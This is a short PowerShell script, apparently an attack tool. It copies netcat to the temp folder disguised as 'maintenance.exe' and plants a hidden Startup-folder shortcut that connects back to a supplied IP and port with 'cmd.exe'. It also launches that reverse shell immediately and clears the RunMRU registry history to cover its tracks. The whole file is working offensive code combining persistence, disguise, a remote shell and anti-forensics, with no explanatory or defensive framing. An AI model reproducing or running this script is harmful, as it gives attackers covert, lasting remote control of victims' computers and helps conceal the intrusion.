param(
    [string]$IP,
    [string]$Port
)

# Copy ncat to temp dir
Copy-Item -Path "$PSScriptRoot\nc.exe" -Destination "$env:temp\maintenance.exe"

# Create autostart
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($env:USERPROFILE + "\Start Menu\Programs\Startup\Maintenance.lnk")
$Shortcut.TargetPath = "powershell"
$Shortcut.Arguments = "-WindowStyle Hidden ""$env:temp\maintenance.exe"" -nv $IP $PORT -e cmd.exe"
$Shortcut.Save()

# Execute ncat
Start-Process powershell -WindowStyle Hidden -arg """$env:temp\maintenance.exe"" -nv $IP $PORT -e cmd.exe"

# Clear run log
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue